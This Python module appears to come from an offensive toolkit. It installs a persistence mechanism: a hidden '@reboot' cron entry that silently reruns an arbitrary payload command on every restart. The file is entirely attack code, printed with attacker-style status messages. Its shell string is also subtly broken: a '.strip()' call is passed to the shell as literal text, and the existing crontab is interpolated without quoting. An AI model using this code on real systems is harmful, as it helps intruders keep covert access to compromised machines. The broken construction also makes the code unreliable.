from ..core import CronPersistence
from ..utils.helpers import run_command

class RebootCronPersistence(CronPersistence):
    def create(self, payload_command: str):
        print(f"[*] Installing @reboot cron job...")
        result = run_command('crontab -l 2>/dev/null')
        existing = result['stdout'] if result['success'] else ''
        entry = f"@reboot {payload_command} >/dev/null 2>&1\n"

        if entry.strip() in existing.splitlines():
            print("[!] Already exists")
            return None

        cmd = f'echo "{existing + entry}".strip() | crontab -'
        if run_command(cmd)['success']:
            print(f"[+] @reboot persistence installed")
            return {
                'method': 'reboot_cron',
                'remove_command': 'crontab -l | grep -v "@reboot" | crontab -'
            }
        return None